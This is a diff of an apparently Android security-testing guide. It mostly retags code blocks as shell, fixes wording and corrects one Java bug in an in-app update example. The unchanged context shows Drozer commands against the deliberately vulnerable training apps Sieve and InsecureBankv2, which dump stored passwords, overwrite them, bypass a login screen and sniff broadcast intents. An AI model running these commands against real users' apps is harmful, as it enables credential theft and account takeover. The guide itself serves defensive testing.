@@ -528,7 +528,7 @@ BroadcastReceivers should use the `android:permission` attribute;  otherwise, ot
 
 You can enumerate IPC components with Drozer. To list all exported IPC components, use the module `app.package.attacksurface`:
 
-```
+```shell
 dz> run app.package.attacksurface com.mwr.example.sieve
 Attack Surface:
   3 activities exported
@@ -542,7 +542,7 @@ Attack Surface:
 
 The "Sieve" application implements a vulnerable content provider. To list the content providers exported by the Sieve app, execute the following command:
 
-```
+```shell
 dz> run app.provider.finduri com.mwr.example.sieve
 Scanning com.mwr.example.sieve...
 content://com.mwr.example.sieve.DBContentProvider/
@@ -557,12 +557,12 @@ content://com.mwr.example.sieve.DBContentProvider/Keys
 
 Content providers with names like "Passwords" and "Keys" are prime suspects for sensitive information leaks. After all, it wouldn't be good if sensitive keys and passwords could simply be queried from the provider!
 
-```
+```shell
 dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys
 Permission Denial: reading com.mwr.example.sieve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys from pid=4268, uid=10054 requires com.mwr.example.sieve.READ_KEYS, or grantUriPermission()
 ```
 
-```
+```shell
 dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
 | Password          | pin  |
 | SuperPassword1234 | 1234 |
@@ -570,7 +570,7 @@ dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Key
 
 This content provider can be accessed without permission.
 
-```
+```shell
 dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string  Password "newpassword"
 dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
 | Password    | pin  |
@@ -581,7 +581,7 @@ dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Key
 
 To list activities exported by an application, use the module `app.activity.info`. Specify the target package with `-a` or omit the option to target all apps on the device:
 
-```
+```shell
 dz> run app.activity.info -a com.mwr.example.sieve
 Package: com.mwr.example.sieve
   com.mwr.example.sieve.FileSelectActivity
@@ -594,7 +594,7 @@ Package: com.mwr.example.sieve
 
 Enumerating activities in the vulnerable password manager "Sieve" shows that the activity `com.mwr.example.sieve.PWList` is exported with no required permissions. It is possible to use the module `app.activity.start` to launch this activity.
 
-```
+```shell
 dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
 ```
 
@@ -604,7 +604,7 @@ Since the activity is called directly in this example, the login form protecting
 
 Services can be enumerated with the Drozer module `app.service.info`:
 
-```
+```shell
 dz> run app.service.info -a com.mwr.example.sieve
 Package: com.mwr.example.sieve
   com.mwr.example.sieve.AuthService
@@ -617,7 +617,7 @@ To communicate with a service, you must first use static analysis to identify th
 
 Because this service is exported, you can use the module `app.service.send` to communicate with the service and change the password stored in the target application:
 
-```
+```shell
 dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg  6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj
 Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
   what: 4
@@ -630,7 +630,7 @@ Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
 
 Broadcasts can be enumerated via the Drozer module `app.broadcast.info`. The target package should be specified via the `-a` parameter:
 
-```
+```shell
 dz> run app.broadcast.info -a com.android.insecurebankv2
 Package: com.android.insecurebankv2
   com.android.insecurebankv2.MyBroadCastReceiver
@@ -641,13 +641,13 @@ In the example app "Android Insecure Bank", one broadcast receiver is exported w
 
 With the Drozer module `app.broadcast.send`, we can formulate an intent to trigger the broadcast and send the password to a phone number within our control:
 
-```
+```shell
 dz>  run app.broadcast.send --action theBroadcast --extra string phonenumber 07123456789 --extra string newpass 12345
 ```
 
 This generates the following SMS:
 
-```
+```shell
 Updated Password from: SecretPassword@ to: 12345
 ```
 
@@ -657,7 +657,7 @@ If an Android application broadcasts intents without setting a required permissi
 
 To register a broadcast receiver to sniff intents, use the Drozer module `app.broadcast.sniff` and specify the action to monitor with the `--action` parameter:
 
-```
+```shell
 dz> run app.broadcast.sniff  --action theBroadcast
 [*] Broadcast receiver registered to sniff matching intents
 [*] Output is updated once a second. Press Control+C to exit.
@@ -665,7 +665,7 @@ dz> run app.broadcast.sniff  --action theBroadcast
 Action: theBroadcast
 Raw: Intent { act=theBroadcast flg=0x10 (has extras) }
 Extra: phonenumber=07123456789 (java.lang.String)
-Extra: newpass=12345 (java.lang.String)
+Extra: newpass=12345 (java.lang.String)`
 ```
 
 
@@ -1197,7 +1197,7 @@ Task<AppUpdateInfo> appUpdateInfo = appUpdateManager.getAppUpdateInfo();
 if (appUpdateInfo.updateAvailability() == UpdateAvailability.UPDATE_AVAILABLE
       // For a flexible update, use AppUpdateType.FLEXIBLE
       && appUpdateInfo.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE)) {
-                  // Request the update.
+
 
 
                   //...Part 2: request update
@@ -1212,11 +1212,12 @@ if (appUpdateInfo.updateAvailability() == UpdateAvailability.UPDATE_AVAILABLE
                      MY_REQUEST_CODE);
 
 
+
                      //...Part 3: check if update completed succesfully
  @Override
  public void onActivityResult(int requestCode, int resultCode, Intent data) {
    if (myRequestCode == MY_REQUEST_CODE) {
-     if (myRequestCode != RESULT_OK) {
+     if (resultCode != RESULT_OK) {
        log("Update flow failed! Result code: " + resultCode);
        // If the update is cancelled or fails,
        // you can request to start the update again in case of forced updates
@@ -1253,13 +1254,13 @@ protected void onResume() {
 
 When checking for a proper update mechanism, make sure the usage of the `AppUpdateManager` is present. If it is not yet, then this means that users might be able to remain on an older version of the application with the given vulnerabilities.
 Next, pay attention to the `AppUpdateType.IMMEDIATE` use: if a security update comes in, then this flag should be used in order to make sure that the user cannot go forward with using the app without updating it.
-As you can see, in part 3 of the example: make sure that cancelations or errors do end up in re-checks and that a user cannot move forward in case of a critical security update.
-Last, in part 4: you can see that for every entrypoint in the application, an update-mechanism should be enforced, so that bypassing it will be harder.
+As you can see, in part 3 of the example: make sure that cancellations or errors do end up in re-checks and that a user cannot move forward in case of a critical security update.
+Finally, in part 4: you can see that for every entrypoint in the application, an update-mechanism should be enforced, so that bypassing it will be harder.
 
 #### Dynamic analysis
 In order to test for proper updating: try downloading an older version of the application with a security vulnerability, either by a release from the developers or by using a third party app-store.
 Next, see if it requires the enforced updating and if you are able to cancel the update one way or another and if you can then still continue to use the app / exploit the vulnerability. This includes validating whether the back-end will stop calls to vulnerable back-ends and/or whether the vulnerable app-version itself is blocked by the back-end.
-Last, see if you can play with the version number of a man-in-the-middled app and see how the backend responds to this (and if it is recorded at all for instance).
+Lastly, see if you can play with the version number of a man-in-the-middled app and see how the backend responds to this (and if it is recorded at all for instance).
 
 
 ### References
